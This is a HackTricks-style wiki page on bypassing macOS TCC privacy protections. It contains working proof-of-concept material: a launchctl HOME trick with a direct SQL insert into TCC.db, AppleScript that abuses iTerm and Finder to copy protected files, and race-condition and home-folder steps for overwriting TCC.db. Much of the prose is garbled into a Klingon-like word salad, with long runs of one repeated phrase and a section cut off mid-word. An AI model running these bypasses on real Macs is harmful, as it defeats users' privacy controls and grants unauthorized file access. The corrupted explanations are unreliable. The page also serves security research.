# macOS TCC Bypasses

<details>

<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Other ways to support HackTricks:

* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## By functionality

### Write Bypass

This is not a bypass, it's just how TCC works: **It doesn't protect from writing**. If Terminal **doesn't have access to read the Desktop of a user it can still write into it**:

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>!Duj</strong></a><strong>!</strong></summary>

HackTricks vItlhutlh:

* **tlhIngan Hol** **HackTricks** **Dujmey** **advertised** **company** **want** **or** **HackTricks** **PDF** **download** **to** **SUBSCRIPTION PLANS** **Check** [**ghItlh**](https://github.com/sponsors/carlospolop)!
* [**PEASS & HackTricks swag**](https://peass.creator-spring.com) **official** **Get**
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) **Discover**, [**NFTs**](https://opensea.io/collection/the-peass-family) **exclusive** **collection** **our**
* 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) **Join** **the** **or** [**telegram group**](https://t.me/peass) **or** **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **hacking tricks** **your** **Share** **by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) **and** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **github repos**.

</details>

## By functionality

### Write Bypass

**ghItlh** **bypass** **not** **a**, **TCC** **bypass** **not** **It's**, **just** **how** **TCC** **works**: **It doesn't protect from writing**. **If Terminal** **doesn't have access to read the Desktop of a user it can still write into it**:
```shell-session
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % echo asd > Desktop/lalala
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % cat Desktop/lalala
asd
```
**com.apple.macl** **extended attribute** jImej **file** **creators app** **access** **read** **ghItlh**.

### SSH Bypass

**SSH** **access** **"Full Disk Access"** **default** **ghItlh**. **Disable** **need** **listed** **disabled** (**list** **remove** **privileges** **won't** **remove**):

![](<../../../../../.gitbook/assets/image (569).png>)

**malwares** **bypass** **protection** **examples** **find**:

* [https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/](https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/)

{% hint style="danger" %}
**Note** **now**, **SSH** **enable** **need** **Full Disk Access**
{% endhint %}

### Handle extensions - CVE-2022-26767

**com.apple.macl** **attribute** **files** **certain application permissions** **read** **ghItlh**. **attribute** **set** **drag\&drop** **file** **app**, **user** **double-clicks** **file** **open** **default application**.

**user** **register** **malicious app** **handle** **extensions** **call** **Launch Services** **open** **file** (**malicious file** **granted access** **read**).

### iCloud

**entitlement** **com.apple.private.icloud-account-access** **communicate** **com.apple.iCloudHelper** **XPC service** **provide iCloud tokens**.

**iMovie** **Garageband** **entitlement** **allowed**.

**information** **exploit** **get icloud tokens** **entitlement** **check** **talk**: [**#OBTS v5.0: "What Happens on your Mac, Stays on Apple's iCloud?!" - Wojciech Regula**](https://www.youtube.com/watch?v=\_6e2LhmxVc0)

### kTCCServiceAppleEvents / Automation

**app** **kTCCServiceAppleEvents** **permission** **able** **control other Apps**. **means** **able** **abuse permissions granted other Apps**.

**info** **Apple Scripts** **check**:

{% content-ref url="macos-apple-scripts.md" %}
[macos-apple-scripts.md](macos-apple-scripts.md)
{% endcontent-ref %}

**example**, **App** **Automation permission** **iTerm**, **example** **Terminal** **access** **iTerm**:

<figure><img src="../../../../../.gitbook/assets/image (2) (2) (1).png" alt=""><figcaption></figcaption></figure>

#### Over iTerm

**Terminal**, **FDA** **have**, **call** **iTerm**, **FDA**, **perform actions**:

{% code title="iterm.script" %}
```applescript
tell application "iTerm"
activate
tell current window
create tab with default profile
end tell
tell current session of current window
write text "cp ~/Desktop/private.txt /tmp"
end tell
end tell
```
{% endcode %}
```bash
osascript iterm.script
```
#### Finder jup

Bev Sov'laH 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' v
```applescript
set a_user to do shell script "logname"
tell application "Finder"
set desc to path to home folder
set copyFile to duplicate (item "private.txt" of folder "Desktop" of folder a_user of item "Users" of disk of home) to folder desc with replacing
set t to paragraphs of (do shell script "cat " & POSIX path of (copyFile as alias)) as text
end tell
do shell script "rm " & POSIX path of (copyFile as alias)
```
## By App behaviour

### CVE-2020–9934 - TCC <a href="#c19b" id="c19b"></a>

**tccd daemon** jen using the **`HOME`** **env** variable to access the TCC users database from: **`$HOME/Library/Application Support/com.apple.TCC/TCC.db`**

[This Stack Exchange post](https://stackoverflow.com/questions/135688/setting-environment-variables-on-os-x/3756686#3756686) jen, je **tccd daemon** jen running via `launchd` within the current user’s domain, jen possible to **control all environment variables** passed to it.\
So, an **attacker jen set `$HOME` environment** variable in **`launchctl`** to point to a **controlled** **directory**, **restart** the **TCC** daemon, je then **directly modify the TCC database** to give itself **every TCC entitlement available** without ever prompting the end user.\
PoC:
```bash
# reset database just in case (no cheating!)
$> tccutil reset All
# mimic TCC's directory structure from ~/Library
$> mkdir -p "/tmp/tccbypass/Library/Application Support/com.apple.TCC"
# cd into the new directory
$> cd "/tmp/tccbypass/Library/Application Support/com.apple.TCC/"
# set launchd $HOME to this temporary directory
$> launchctl setenv HOME /tmp/tccbypass
# restart the TCC daemon
$> launchctl stop com.apple.tccd && launchctl start com.apple.tccd
# print out contents of TCC database and then give Terminal access to Documents
$> sqlite3 TCC.db .dump
$> sqlite3 TCC.db "INSERT INTO access
VALUES('kTCCServiceSystemPolicyDocumentsFolder',
'com.apple.Terminal', 0, 1, 1,
X'fade0c000000003000000001000000060000000200000012636f6d2e6170706c652e5465726d696e616c000000000003',
NULL,
NULL,
'UNUSED',
NULL,
NULL,
1333333333333337);"
# list Documents directory without prompting the end user
$> ls ~/Documents
```
### CVE-2021-30761 - Qap

Qap vItlhutlhlu'pu' 'e' vItlhutlhlu'pu' TCC protected lo'laHvIS, 'ach vaj Qap vItlhutlhlu'pu' 'e' **vItlhutlhlu'pu' vItlhutlhlu'pu' lo'laHvIS**. So, Qap vItlhutlhlu'pu' 'e' vItlhutlhlu'pu' vItlhutlhlu'pu' lo'laHvIS vIleghbogh vaj vItlhutlhlu'pu' vItlhutlhlu'pu' lo'laHvIS vIleghbogh:

<figure><img src="../../../../../.gitbook/assets/image (6) (1) (3).png" alt=""><figcaption></figcaption></figure>

### CVE-2021-30782 - Translocation

`/usr/libexec/lsd` binary vItlhutlhlu'pu' 'e' **`libsecurity_translocate`** library vItlhutlhlu'pu' 'e' **`com.apple.private.nullfs_allow`** entitlement, vaj vItlhutlhlu'pu' 'e' **`com.apple.private.tcc.allow`** entitlement vIleghbogh **`kTCCServiceSystemPolicyAllFiles`** vIleghbogh.

"Library" vItlhutlhlu'pu' 'e' quarantine attribute vIlo'laHbe', **`com.apple.security.translocation`** XPC service vItlhutlhlu'pu' 'e' cha'logh Library **`$TMPDIR/AppTranslocation/d/d/Library`** vIleghbogh vaj Library vItlhutlhlu'pu' 'e' **'e' vItlhutlhlu'pu'**.

### CVE-2023-38571 - Music & TV <a href="#cve-2023-38571-a-macos-tcc-bypass-in-music-and-tv" id="cve-2023-38571-a-macos-tcc-bypass-in-music-and-tv"></a>

**`Music`** vItlhutlhlu'pu' 'e' **qawHaq**: Qap vItlhutlhlu'pu' 'e' vItlhutlhlu'pu' **`~/Music/Music/Media.localized/Automatically Add to Music.localized`** vIleghbogh user's "media library" vIleghbogh. Qap vItlhutlhlu'pu' 'e' **`rename(a, b);`** vaj `a` vaj `b` 'oH:

* `a = "~/Music/Music/Media.localized/Automatically Add to Music.localized/myfile.mp3"`
* `b = "~/Music/Music/Media.localized/Automatically Add to Music.localized/Not Added.localized/2023-09-25 11.06.28/myfile.mp3`

**`rename(a, b);`** vItlhutlhlu'pu' 'e' **Race Condition** vIleghbogh, vaj 'e' vItlhutlhlu'pu' 'e' **TCC.db** file 'e' 'e' vItlhutlhlu'pu' 'e' **`Automatically Add to Music.localized`** cha'logh, vaj 'e' vItlhutlhlu'pu' 'e' **'e' vItlhutlhlu'pu'** vaj vItlhutlhlu'pu' 'e' **`~/Library/Application Support/com.apple.TCC`**/.

### SQLITE\_SQLLOG\_DIR - CVE-2023-32422

vaj **`SQLITE_SQLLOG_DIR="path/folder"`** vItlhutlhlu'pu' 'e' **'e' vItlhutlhlu'pu'** 'e' **'e' vItlhutlhlu'pu'**. 'Iv vItlhutlhlu'pu' 'e' **SQLite database** vItlhutlhlu'pu' 'e' **'e' vItlhutlhlu'pu'** vaj **`SQLITE_SQLLOG_DIR`** vItlhutlhlu'pu' 'e' **symlink** vaj 'e' vItlhutlhlu'pu' 'e' **'e' vItlhutlhlu'pu'** vaj user **TCC.db vItlhutlhlu'pu'** vaj vItlhutlhlu'pu' 'e' **'e' vItlhutlhlu'pu'**.\
**More info** [**in the writeup**](https://gergelykalman.com/sqlol-CVE-2023-32422-a-macos-tcc-bypass.html) **and**[ **in the talk**](https://www.youtube.com/watch?v=f1HA5QhLQ7Y\&t=20548s).

### **SQLITE\_AUTO\_TRACE**

vaj **`SQLITE_AUTO_TRACE`** environment variable vItlhutlhlu'pu' 'e' vItlhutlhlu'pu' **'e' vItlhutlhlu'pu'**. vaj vItlhutlhlu'pu' 'e' **`libsqlite3.dylib`** library vItlhutlhlu'pu' 'e' **'e' vItlhutlhlu'pu'** vaj **log** vaj **SQL queries**. 'Iv vItlhutlhlu'pu' 'e' **Apple applications** vItlhutlhlu'pu' 'e' **TCC protected information** vItlhutlhlu'pu' 'e' vItlhutlhlu'pu' 'e' vItlhutlhlu'pu' 'e' vItlhutlhlu'pu' 'e' vItlhutlhlu'pu' 'e' vItlhutlhlu'pu' 'e' vItlhutlhlu'pu' 'e' vItlhutlhlu'pu' 'e' vItlhutlhlu'pu' 'e' vItlhutlhlu'pu' 'e' vItlhutlhlu'pu' 'e' vItlhutlhlu'pu' 'e' vItlhutlhlu'pu' 'e' vItlhutlhlu'pu' 'e' vItlhutlhlu'pu' 'e' vItlhutlhlu'pu' 'e' vItlhutlhlu'pu' 'e' vItlhutlhlu'pu' 'e' vItlhutlhlu'pu' 'e' vItlhutlhlu'pu' 'e' vItlhutlhlu'pu' 'e' vItlhutlhlu'pu' 'e' vItlhutlhlu'pu' 'e' vItlhutlhlu'pu' 'e' vItlhutlhlu'pu' 'e' vItlhutlhlu'pu' 'e' vItlhutlhlu'pu' 'e' vItlhutlhlu'pu' 'e' vItlhutlhlu'pu' 'e' vItlhutlhlu'pu' 'e' vItlhutlhlu'pu' 'e' vItlhutlhlu'pu' 'e' vItlhutlhlu'pu' 'e' vItlhutlhlu'pu' 'e' vItlhutlhlu'pu' 'e' vItlhutlhlu'pu' 'e' vItlhutlhlu'pu' 'e' vItlhutlhlu'pu' 'e' vItlhutlhlu'pu' 'e' vItlhutlhlu'pu' 'e' vItlhutlhlu'pu' 'e' vItlhutlhlu'pu' 'e' vItlhutlhlu'pu' 'e' vItlhutlhlu'pu' 'e' vItlhutlhlu'pu' 'e' vItlhutlhlu'pu' 'e' vItlhutlhlu'pu' 'e' vItlhutlhlu'pu' 'e' vItlhutlhlu'pu' 'e' vItlhutlhlu'pu' 'e' vItlhutlhlu'pu' 'e' vItlhutlhlu'pu' 'e' vItlhutlhlu'pu' 'e' vItlhutlhlu'pu' 'e' vItlhutlhlu'pu' 'e' vItlhutlhlu'pu' 'e' vItlhutlhlu'pu' 'e' vItlhutlhlu'pu' 'e' vItlhutlhlu'pu' 'e' vItlhutlhlu'pu' 'e' vItlhutlhlu'pu' 'e' vItlhutlhlu'pu' 'e' vItlhutlhlu'pu' 'e' vItlhutlhlu'pu' 'e' vItlhutlhlu'pu' 'e' vItlhutlhlu'pu' 'e' vItlhutlhlu'pu' 'e' vItlhutlhlu'pu' 'e' vItlhutlhlu'pu' 'e' vItlhutlhlu'pu' 'e' vItlhutlhlu'pu' 'e' vItlhutlhlu'pu' 'e' vItlhutlhlu'pu' 'e' vItlhutlhlu'pu' 'e' vItlhutlhlu'pu' 'e' vItlhutlhlu'pu' 'e' vItlhutlhlu'pu' 'e' vItlhutlhlu'pu' 'e' vItlhutlhlu'pu' 'e' vItlhutlhlu'pu' 'e' vItlhutlhlu'pu' 'e' vItlhutlhlu'pu' 'e' vItlhutlhlu'pu' 'e' vItlhutlhlu'pu' 'e' vItlhutlhlu'pu' 'e' vItlhutlhlu'pu' 'e' vItlhutlhlu'pu' 'e' vItlhutlhlu'pu' 'e' vItlhutlhlu'pu' 'e' vItlhutlhlu'pu' 'e' vItlhutlhlu'pu' 'e' vItlhutlhlu'pu' 'e' vItlhutlhlu'pu' 'e' vItlhutlhlu'pu' 'e' vItlhutlhlu'pu' 'e' vItlhutlhlu'pu' 'e' vItlhutlhlu'pu' 'e' vItlhutlhlu'pu' 'e' vItlhutlhlu'pu' 'e' vItlhutlhlu'pu' 'e' vItlhutlhlu'pu' 'e' vItlhutlhlu'pu' 'e' vItlhutlhlu'pu' 'e' vItlhutlhlu'pu' 'e' vItlhutlhlu'pu' 'e' vItlhutlhlu'pu' 'e' vItlhutlhlu'pu' 'e' vItlhutlhlu'pu' 'e' vItlhutlhlu'pu' 'e' vItlhutlhlu'pu' 'e' vItlhutlhlu'pu' 'e' vItlhutlhlu'pu' 'e' vItlhutlhlu'pu' 'e' vItlhutlhlu'pu' 'e' vItlhutlhlu'pu' 'e' vItlhutlhlu'pu' 'e' vItlhutlhlu'pu' 'e' vItlhutlhlu'pu' 'e' vItlhutlhlu'pu' 'e' vItlhutlhlu'pu' 'e' vItlhutlhlu'pu' 'e' vItlhutlhlu'pu' 'e' vItlhutlhlu'pu' 'e' vItlhutlhlu'pu' 'e' vItlhutlhlu'pu' 'e' vItlhutlhlu'pu' 'e' vItlhutlhlu'pu' 'e' vItlhutlhlu'pu' 'e' vItlhutlhlu'pu' 'e' vItlhutlhlu'pu' 'e' vItlhutlhlu'pu' 'e' vItlhutlhlu'pu' 'e' vItlhutlhlu'pu' 'e' vItlhutlhlu'pu' 'e' vItlhutlhlu'pu' 'e' vItlhutlhlu'pu' 'e' vItlhutlhlu'pu' 'e' vItlhutlhlu'pu' 'e' vItlhutlhlu'pu' 'e' vItlhutlhlu'pu' 'e' vItlhutlhlu'pu' 'e' vItlhutlhlu'pu' 'e' vItlhutlhlu'pu' 'e' vItlhutlhlu'pu' 'e' vItlhutlhlu'pu' 'e' vItlhutlhlu'pu' 'e' vItlhutlhlu'pu' 'e' vItlhutlhlu'pu' 'e' vItlhutlhlu'pu' 'e' vItlhutlhlu'pu' 'e' vItlhutlhlu'pu' 'e' vItlhutlhlu'pu' 'e' vItlhutlhlu'pu' 'e' vItlhutlhlu'pu' 'e' vItlhutlhlu'pu'
```bash
# Set this env variable everywhere
launchctl setenv SQLITE_AUTO_TRACE 1
```
### MTL\_DUMP\_PIPELINES\_TO\_JSON\_FILE - CVE-2023-32407

**env variable** **tlhIngan Hol** **`Metal` framework** **Dochvam** **programs** **dependency**, **`Music`** **notably**, **FDA**.

**Setting**: `MTL_DUMP_PIPELINES_TO_JSON_FILE="path/name"`. **path** **valid directory**, **bug** **trigger** **`fs_usage`** **program** **going**:

* **file** **`open()`ed**, **`path/.dat.nosyncXXXX.XXXXXX`** (X **random**)
* **one or more `write()`s** **contents** **file** (**control**)
* **`path/.dat.nosyncXXXX.XXXXXX`** **`renamed()`d** **`path/name`**

**temporary file write**, **`rename(old, new)`** **not secure**.

**not secure** **resolve old and new paths separately**, **time** **vulnerable** **Race Condition**. **xnu** **function** **`renameat_internal()`** **information**.

{% hint style="danger" %}
**privileged process** **renaming** **folder** **control**, **RCE** **win** **access** **different file**, **CVE**, **open** **privileged app** **created** **store** **FD**.

**rename** **access** **folder** **control**, **modified** **source file** **FD**, **destination file** (folder) symlink, **write** **want**.
{% endhint %}

**attack** **CVE**: **overwrite** **user's `TCC.db`**, **can**:

* **create** `/Users/hacker/ourlink` **point** `/Users/hacker/Library/Application Support/com.apple.TCC/`
* **create** **directory** `/Users/hacker/tmp/`
* **set** `MTL_DUMP_PIPELINES_TO_JSON_FILE=/Users/hacker/tmp/TCC.db`
* **trigger** **bug** **running** `Music` **env var**
* **catch** **`open()`** `/Users/hacker/tmp/.dat.nosyncXXXX.XXXXXX` (X **random**)
* **`open()`** **file** **writing**, **hold** **file descriptor**
* **atomically switch** `/Users/hacker/tmp` **`/Users/hacker/ourlink`** **loop**
* **maximize** **chances** **succeeding** **race window** **slim**, **losing** **race** **negligible** **downside**
* **wait** **bit**
* **test** **lucky**
* **not**, **run** **top**

**info** [https://gergelykalman.com/lateralus-CVE-2023-32407-a-macos-tcc-bypass.html](https://gergelykalman.com/lateralus-CVE-2023-32407-a-macos-tcc-bypass.html)

{% hint style="danger" %}
**env variable** **MTL_DUMP_PIPELINES_TO_JSON_FILE** **apps** **launch**
{% endhint %}

### Apple Remote Desktop

**root** **enable** **service**, **ARD agent** **full disk access** **abused** **user** **copy** **new **TCC user database**.

## By **NFSHomeDirectory**

**TCC** **database** **user's HOME folder** **control** **access** **resources** **specific** **user** **$HOME/Library/Application Support/com.apple.TCC/TCC.db**.\
**user** **restart** **TCC** **$HOME env variable** **different folder**, **user** **create** **new TCC database** **/Library/Application Support/com.apple.TCC/TCC.db** **trick** **TCC** **grant** **TCC permission** **app**.

{% hint style="success" %}
**Apple** **setting** **stored** **user's profile** **`NFSHomeDirectory`** **attribute** **value** **`$HOME`**, **compromise** **application** **permissions** **modify** **value** (**`kTCCServiceSystemPolicySysAdminFiles`**), **weaponize** **option** **TCC bypass**.
{% endhint %}

### [CVE-2020–9934 - TCC](./#c19b) <a href="#c19b" id="c19b"></a>

### [CVE-2020-27937 - Directory Utility](./#cve-2020-27937-directory-utility-1)

### CVE-2021-30970 - Powerdir

**first POC** **dsexport** **dsimport** **modify** **HOME** **folder** **user**.

1. **Get** _csreq_ **blob** **target app**.
2. **Plant** **fake** _TCC.db_ **file** **required access** **csreq** **blob**.
3. **Export** **user’s Directory Services entry** **dsexport**.
4. **Modify** **Directory Services entry** **change** **user’s home directory**.
5. **Import** **modified Directory Services entry** **dsimport**.
6. **Stop** **user’s _tccd_** **reboot** **process**.

**second POC** **`/usr/libexec/configd`** **`com.apple.private.tcc.allow`** **value** **`kTCCServiceSystemPolicySysAdminFiles`**.\
